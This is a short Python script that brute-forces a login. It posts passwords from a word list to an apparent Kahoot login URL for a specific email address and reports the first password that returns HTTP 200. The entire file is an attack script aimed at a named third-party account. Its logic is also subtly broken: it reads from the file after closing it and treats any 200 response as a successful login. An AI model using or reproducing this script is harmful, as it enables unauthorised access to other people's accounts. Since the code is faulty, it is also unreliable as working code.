import requests

def brute_force_login(url, username, password_file):
    with open(password_file, 'r') as file:
        passwords = (line.strip() for line in file)

    session = requests.Session()

    for password in passwords:
        payload = {'username': username, 'password': password}

        try:
            response = session.post(url, data=payload)
            response.raise_for_status()

            if response.status_code == 200:
                print(f"Successful login! Username: {username}, Password: {password}")
                break

        except requests.exceptions.RequestException as e:
            print(f"An error occurred: {e}")
            break

    print("Brute force attack completed.")

# Usage example
url = 'https://create.kahoot.it/auth/login?deviceId=f31cd72d-3ccf-47a6-b643-3f166351d0d4R&sessionId=1698919889501'
username = 'ssjsssksjsjs@gmail.com'
password_file = 'passlist.txt'

brute_force_login(url, username, password_file)

